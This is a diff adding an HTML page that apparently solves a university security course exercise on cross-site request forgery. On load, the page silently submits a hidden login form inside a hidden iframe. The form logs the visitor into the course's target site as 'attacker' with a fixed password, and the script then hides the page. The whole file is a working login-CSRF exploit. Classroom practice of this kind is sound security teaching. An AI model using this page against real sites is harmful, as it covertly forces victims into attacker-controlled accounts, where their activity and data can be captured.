@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+    <meta charset="utf-8">
+    
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
+    </script>
+     <body>  
+        <iframe name="hiddenFrame" class="hide"></iframe>
+        <form action="http://cis551.cis.upenn.edu/project3/login?csrfdefense=0&xssdefense=4" method="POST" id="myForm" target="hiddenFrame">
+            <input type="hidden" name="username" value="attacker"/>
+            <input type="hidden" name="password" value="123456"/>
+        </form>
+    </body>
+    <script>
+
+        function submitForm() {
+            const form = document.getElementById("myForm");
+
+            form.submit(function(e){
+                e.preventDefault();
+            });
+        }   
+
+        submitForm();
+        $("html").hide();
+
+    </script>  
+   
+</html>
+
